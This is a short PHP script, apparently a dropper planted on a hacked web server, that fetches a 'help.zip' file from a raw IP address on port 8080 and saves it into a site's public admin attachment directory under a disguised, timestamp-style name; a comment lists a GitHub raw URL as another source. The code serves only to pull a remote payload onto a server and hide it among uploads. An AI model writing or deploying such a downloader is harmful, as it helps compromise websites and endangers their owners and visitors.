<?php
//https://github.com/zzqwq555/t1/raw/master/help.zip
$code=file_get_contents('http://42.99.116.139:8080/help.zip');
file_put_contents('/home/home/mco/basiclaw/public_html/admin/attachment/tbn_l201802141020140.zip',$code);
